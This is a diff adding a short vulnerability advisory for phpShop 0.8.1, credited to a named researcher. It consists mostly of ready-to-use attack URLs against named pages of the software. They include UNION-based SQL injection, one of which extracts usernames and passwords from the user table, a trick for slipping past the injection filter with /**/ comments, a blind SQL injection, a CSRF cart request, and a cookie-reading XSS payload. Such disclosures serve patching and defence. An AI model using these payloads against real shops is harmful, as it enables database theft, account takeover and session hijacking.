@@ -1,0 +1,34 @@
+**************************************************************
+Vendor: http://www.phpshop.org/
+Discovered By: Andrea Fabrizi
+Email: andrea.fabrizi@gmail.com
+Web: http://www.andreafabrizi.it
+**************************************************************
+
+
+### SQL INJECTION
+http://server/phpshop-0.8.1/?page=admin/function_list&module_id=111111' union select 1,database(),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 -- aaa
+http://server/phpshop-0.8.1/?page=shop/flypage&product_id=1011'/**/union/**/select/**/1,1,1,1,1,password,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,username/**/from/**/auth_user_md5 -- aaa
+http://server/phpshop-0.8.1/?page=vendor/vendor_form&vendor_id=1' and '1'='1
+http://server/phpshop-0.8.1/?page=admin/module_form&module_id=1' and '1'='1
+http://server/phpshop-0.8.1/?page=admin/user_form&user_id=7322f75cc7ba16db1799fd8d25dbcde4' and '1'='1
+http://server/phpshop-0.8.1/?page=vendor/vendor_category_form&vendor_category_id=6' and '1'='1
+http://server/phpshop-0.8.1/?page=store/user_form&user_id=c88ce1c0ad365513d6fe085a8aacaebc' and '1'='1
+http://server/phpshop-0.8.1/?page=store/payment_method_form&payment_method_id=1' and '1'='1
+http://server/phpshop-0.8.1/?page=tax/tax_form&tax_rate_id=2' and '1'='1
+...and many others...
+
+The SQL Injection security check can be bypassed replacing spaces with comments (/**/)
+
+### BLIND SQL INJECTION
+http://server/phpshop-0.8.1/?page=shop/browse&category=aaa' and 1=1 -- aaa
+
+
+### CSRF
+http://server/phpshop-0.8.1/?page=shop/cart&func=cartAdd&product_id=321&
+...and many others...
+
+
+### XSS
+http://server/phpshop-0.8.1/?page=order/order_print&order_id=1"><script>alert(document.cookie);</script>
+...and many others...
